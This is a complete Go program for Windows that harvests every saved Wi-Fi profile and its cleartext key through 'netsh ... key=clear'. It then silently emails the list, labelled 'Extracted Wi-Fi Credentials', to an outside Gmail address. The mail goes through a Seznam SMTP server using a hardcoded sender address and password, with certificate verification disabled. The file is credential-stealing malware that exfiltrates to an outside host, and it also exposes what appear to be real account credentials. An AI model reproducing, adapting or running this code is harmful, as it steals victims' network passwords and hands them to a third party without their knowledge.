package main

import (
	"crypto/tls"
	"fmt"
	"net/smtp"
	"os"
	"os/exec"
	"strings"
)

func getWifiPasswords() ([]string, error) {
	// Run the command to get Wi-Fi profiles on Windows
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to get profiles: %v", err)
	}

	// Parse the output to extract SSIDs (Wi-Fi profiles)
	profilesOutput := string(output)
	lines := strings.Split(profilesOutput, "\n")
	var wifiNames []string

	for _, line := range lines {
		if strings.Contains(line, "All User Profile") {
			// Extract the Wi-Fi profile name
			parts := strings.Split(line, ":")
			if len(parts) == 2 {
				wifiNames = append(wifiNames, strings.TrimSpace(parts[1]))
			}
		}
	}

	return wifiNames, nil
}

func getWifiPassword(profile string) (string, error) {
	// Run the command to get the Wi-Fi password for a given profile
	cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed to get password for %s: %v", profile, err)
	}

	// Parse the output to find the key content
	profilesOutput := string(output)
	lines := strings.Split(profilesOutput, "\n")
	var password string

	for _, line := range lines {
		if strings.Contains(line, "Key Content") {
			// Extract the password
			parts := strings.Split(line, ":")
			if len(parts) == 2 {
				password = strings.TrimSpace(parts[1])
				break
			}
		}
	}

	return password, nil
}

func sendEmail(subject, body string) error {
	// SMTP server configuration for infopeklo.cz
	smtpServer := "smtp.seznam.cz"
	smtpPort := "587" // Use STARTTLS on port 587
	fromEmail := "info@infopeklo.cz"
	fromPassword := "Polik789" // Replace with the correct password
	toEmail := "alfikeita@gmail.com"         // Recipient email address

	// Set up authentication information.
	auth := smtp.PlainAuth("", fromEmail, fromPassword, smtpServer)

	// Connect to the SMTP server using STARTTLS
	conn, err := tls.Dial("tcp", smtpServer+":"+smtpPort, &tls.Config{
		InsecureSkipVerify: true, // Disable certificate verification
		ServerName:          smtpServer,
	})
	if err != nil {
		return fmt.Errorf("failed to connect to SMTP server: %v", err)
	}
	c, err := smtp.NewClient(conn, smtpServer)
	if err != nil {
		return fmt.Errorf("failed to create SMTP client: %v", err)
	}

	// Start the authentication process
	if err := c.Auth(auth); err != nil {
		return fmt.Errorf("SMTP authentication failed: %v", err)
	}

	// Create the message
	message := []byte("Subject: " + subject + "\r\n" +
		"To: " + toEmail + "\r\n" +
		"From: " + fromEmail + "\r\n" +
		"\r\n" + body)

	// Send the email
	if err := c.Mail(fromEmail); err != nil {
		return fmt.Errorf("failed to send email from address: %v", err)
	}
	if err := c.Rcpt(toEmail); err != nil {
		return fmt.Errorf("failed to send email to address: %v", err)
	}
	w, err := c.Data()
	if err != nil {
		return fmt.Errorf("failed to get email data writer: %v", err)
	}
	_, err = w.Write(message)
	if err != nil {
		return fmt.Errorf("failed to write email data: %v", err)
	}
	err = w.Close()
	if err != nil {
		return fmt.Errorf("failed to close email data writer: %v", err)
	}

	// Quit the session
	c.Quit()

	return nil
}

func main() {
	// Get the list of saved Wi-Fi profiles
	profiles, err := getWifiPasswords()
	if err != nil {
		os.Exit(1)
	}

	// Prepare email content
	emailBody := "Extracted Wi-Fi Credentials:\n\n"

	// Loop through each profile and get the password
	for _, profile := range profiles {
		// Get the password for the current profile
		password, err := getWifiPassword(profile)
		if err != nil {
			continue
		}

		// Add the Wi-Fi profile and its password to the email body
		if password != "" {
			emailBody += fmt.Sprintf("SSID: %s | Password: %s\n", profile, password)
		} else {
			emailBody += fmt.Sprintf("SSID: %s | No password set or not available\n", profile)
		}
	}

	// Send the email with the Wi-Fi credentials
	err = sendEmail("Extracted Wi-Fi Credentials", emailBody)
	if err != nil {
		os.Exit(1)
	} else {
		os.Exit(0)
	}
}
